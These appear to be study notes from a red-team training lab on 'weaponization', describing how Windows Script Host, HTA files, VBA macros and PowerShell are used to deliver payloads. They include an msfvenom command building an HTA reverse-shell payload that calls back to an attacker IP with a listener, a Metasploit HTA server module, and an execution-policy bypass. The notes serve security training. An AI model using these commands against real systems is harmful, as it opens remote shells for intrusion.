# Weaponization
scripting techniques, including:

*   The Windows Script Host (WSH)
*   An HTML Application (HTA)
*   Visual Basic Applications (VBA)
*   PowerShell (PSH)

**Windows Scripting Host (WSH)**

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript). It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

**HTML Application (HTA)**

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.

Then serve the payload.hta from a web server, this could be done from the attacking machine.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.17.11 LPORT=1234 -f hta-psh -o thm.hta;nv -lnvp 1234`

```text-plain
use exploit/windows/misc/hta_server
```

**Visual Basic for Application (VBA)**

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.

Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA's features is accessing the Windows Application Programming Interface ([API](https://en.wikipedia.org/wiki/Windows_API)) and other low-level functionality. For more information about VBA, visit [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications). 

Powershell:

```text-plain
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned 
powershell -ex bypass -File thm.ps1
```

to run scripts in ps